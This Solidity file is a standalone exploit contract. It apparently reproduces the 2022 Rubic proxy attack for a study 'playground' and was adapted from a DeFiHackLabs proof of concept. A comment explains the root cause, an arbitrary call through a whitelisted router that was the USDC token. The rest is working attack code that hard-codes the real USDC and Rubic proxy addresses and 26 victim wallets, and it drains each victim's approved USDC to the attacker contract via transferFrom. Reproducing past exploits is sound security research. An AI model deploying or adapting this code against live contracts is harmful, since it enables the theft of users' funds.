// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-Rubic).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest IS the attacker contract — `transferFrom(... address(this) ...)`
// sends the loot to the test). There is no standalone contract to deploy, so we
// reproduce it with a faithful, self-contained copy of the inline attack
// (testExploit body → run()), compiled inside the registry forge project. Logic,
// constants and the 26 victim addresses are copied verbatim from
// test/Rubic_exp.sol.
//
// Root cause: RubicProxy.routerCallNative() forwards an ATTACKER-CONTROLLED
// (_params.router, _data) pair as a raw Address.functionCallWithValue(router,
// data, value) from the proxy's own context. The only gate is a whitelist check
// (availableRouters.contains(router)); that whitelist contained the USDC token
// itself, and the proxy held unlimited ERC-20 approvals from many users. The
// attacker therefore sets router = USDC and data = transferFrom(victim, this,
// min(balance, allowance)) — since the proxy is the approved spender, USDC
// moves each victim's full balance (capped by their allowance) to this contract.
// No flash loan, no price manipulation — just an arbitrary external call in a
// permission-holding aggregator that whitelisted a token contract.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IRubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
}

interface IRubicProxy2 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(
        string calldata _providerInfo,
        BaseCrossChainParams calldata _params,
        bytes calldata _data
    ) external;
}

contract RubicAllowanceDrain {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IRubicProxy1 constant RUBIC1 = IRubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
    IRubicProxy2 constant RUBIC2 = IRubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
    address constant INTEGRATOR = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    function run() external {
        address[26] memory victims = [
            0x6b8D6E89590E41Fa7484691fA372c3552E93e91b,
            0x036B5805F9175297Ec2adE91678d6ea0a1e2272A,
            0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0,
            0xff266f62a0152F39FCf123B7086012cEb292516A,
            0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D,
            0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B,
            0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981,
            0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a,
            0x915E88322EDFa596d29BdF163b5197c53cDB1A68,
            0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5,
            0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA,
            0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb,
            0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1,
            0x58709C660B2d908098FE95758C8a872a3CaA6635,
            0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9,
            0xfE243903c13B53A57376D27CA91360C6E6b3FfAC,
            0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1,
            0xd6389E37f7c2dB6De56b92f430735D08d702111E,
            0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC,
            0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37,
            0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861,
            0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28,
            0x192FcF067D36a8BC9322b96Bb66866c52C43B43F,
            0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805,
            0x44a59A1d38718c5cA8cB6E8AA7956859D947344B,
            0xD0245a08f5f5c54A24907249651bEE39F3fE7014
        ];

        // Victims 0..7 are drained via RubicProxy v1 (routerCallNative(_params, _data)).
        IRubicProxy1.BaseCrossChainParams memory params1 = IRubicProxy1.BaseCrossChainParams({
            srcInputToken: address(0),
            srcInputAmount: 0,
            dstChainID: 0,
            dstOutputToken: address(0),
            dstMinOutputAmount: 0,
            recipient: address(0),
            integrator: INTEGRATOR,
            router: address(USDC)
        });
        for (uint256 i = 0; i < 8; i++) {
            uint256 victimsBalance = USDC.balanceOf(victims[i]);
            uint256 victimsAllowance = USDC.allowance(victims[i], address(RUBIC1));
            uint256 amount = victimsBalance;
            if (victimsBalance >= victimsAllowance) {
                amount = victimsAllowance;
            }
            bytes memory data =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), amount);
            RUBIC1.routerCallNative(params1, data);
        }

        // Victims 8..25 are drained via RubicProxy v2 (extra leading "" provider string).
        IRubicProxy2.BaseCrossChainParams memory params2 = IRubicProxy2.BaseCrossChainParams({
            srcInputToken: address(0),
            srcInputAmount: 0,
            dstChainID: 0,
            dstOutputToken: address(0),
            dstMinOutputAmount: 0,
            recipient: address(0),
            integrator: INTEGRATOR,
            router: address(USDC)
        });
        for (uint256 i = 8; i < victims.length; i++) {
            uint256 victimsBalance = USDC.balanceOf(victims[i]);
            uint256 victimsAllowance = USDC.allowance(victims[i], address(RUBIC2));
            uint256 amount = victimsBalance;
            if (victimsBalance >= victimsAllowance) {
                amount = victimsAllowance;
            }
            bytes memory data =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), amount);
            RUBIC2.routerCallNative("", params2, data);
        }
    }
}
